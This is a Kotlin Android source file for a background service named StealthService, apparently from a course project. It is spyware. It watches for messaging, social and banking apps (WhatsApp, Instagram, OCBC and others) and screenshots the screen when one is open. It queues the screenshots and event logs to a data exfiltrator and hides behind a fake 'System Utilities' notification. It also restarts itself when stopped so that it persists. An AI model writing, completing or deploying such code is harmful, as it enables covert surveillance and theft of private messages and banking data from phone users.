package com.example.inf2215

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.*

class StealthService : Service() {

    private val tag = "StealthService"
    private val notificationId = 1001
    private val channelId = "stealth_channel"

    private lateinit var projectionManager: MediaProjectionManager
    private var mediaProjection: MediaProjection? = null

    private lateinit var usageTracker: AppUsageTracker
    private lateinit var screenshotCapture: ScreenshotCapture
    private lateinit var ipcMonitor: IpcMonitor
    private lateinit var cryptoExtractor: CryptoExtractor
    private lateinit var exfiltrator: DataExfiltrator

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val mainHandler = android.os.Handler(android.os.Looper.getMainLooper())

    // List of sensitive apps (package names) – replace with actual targets
    private val sensitiveApps = listOf(
        "com.whatsapp",
        "com.facebook.orca",
        "com.instagram.android",
        "com.zhiliaoapp.musically",
        "com.ocbc.mobile"
    )

    override fun onCreate() {
        super.onCreate()
        projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager

        createNotificationChannel()
        startForeground(notificationId, createNotification())

        usageTracker = AppUsageTracker(this)
        screenshotCapture = ScreenshotCapture(this)
        ipcMonitor = IpcMonitor(this)
        cryptoExtractor = CryptoExtractor(this)
        exfiltrator = DataExfiltrator(this)

        usageTracker.startTracking()
        ipcMonitor.startMonitoring()
        cryptoExtractor.startExtraction()

        startSensitiveAppCheck()
    }

    private fun startSensitiveAppCheck() {
        mainHandler.post(object : Runnable {
            override fun run() {
                checkForegroundApp()
                mainHandler.postDelayed(this, 3000) // every 3 seconds
            }
        })
    }

    private fun checkForegroundApp() {
        val currentApp = usageTracker.currentForegroundApp
        if (currentApp in sensitiveApps) {
            logEvent("SENSITIVE_APP_OPENED", currentApp)
            triggerScreenshot()
        }
    }

    private fun triggerScreenshot() {
        serviceScope.launch {
            val screenshot = screenshotCapture.captureScreenshot()
            screenshot?.let {
                exfiltrator.queueFile(it)
                logEvent("SCREENSHOT", it.name)
            }
        }
    }

    private fun logEvent(type: String, detail: String) {
        val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
        val entry = "$timestamp - $type: $detail"
        saveToFile("events.log", entry)
        exfiltrator.queueData(entry)
    }

    private fun saveToFile(filename: String, data: String) {
        try {
            val dir = File(filesDir, "logs")
            if (!dir.exists()) dir.mkdirs()
            FileOutputStream(File(dir, filename), true).bufferedWriter().use {
                it.write(data)
                it.newLine()
            }
        } catch (e: Exception) { /* ignore */ }
    }

    private fun createNotification(): Notification =
        NotificationCompat.Builder(this, channelId)
            .setContentTitle("System Utilities")
            .setContentText("Optimizing system performance")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "Background Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply { description = "System maintenance" }
            (getSystemService(NotificationManager::class.java)).createNotificationChannel(channel)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent != null) {
            val resultCode = intent.getIntExtra("SCREEN_CAPTURE_RESULT_CODE", 0)
            val data = intent.getParcelableExtra<Intent>("SCREEN_CAPTURE_DATA")
            if (resultCode != 0 && data != null) {
                setupMediaProjection(resultCode, data)
            }
        }
        return START_STICKY
    }

    private fun setupMediaProjection(resultCode: Int, data: Intent) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            mediaProjection = projectionManager.getMediaProjection(resultCode, data)
            screenshotCapture.setMediaProjection(mediaProjection)
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
        usageTracker.stopTracking()
        screenshotCapture.cleanup()
        ipcMonitor.stopMonitoring()
        cryptoExtractor.stopExtraction()
        exfiltrator.shutdown()

        // Restart to maintain persistence
        startService(Intent(this, StealthService::class.java))
    }
}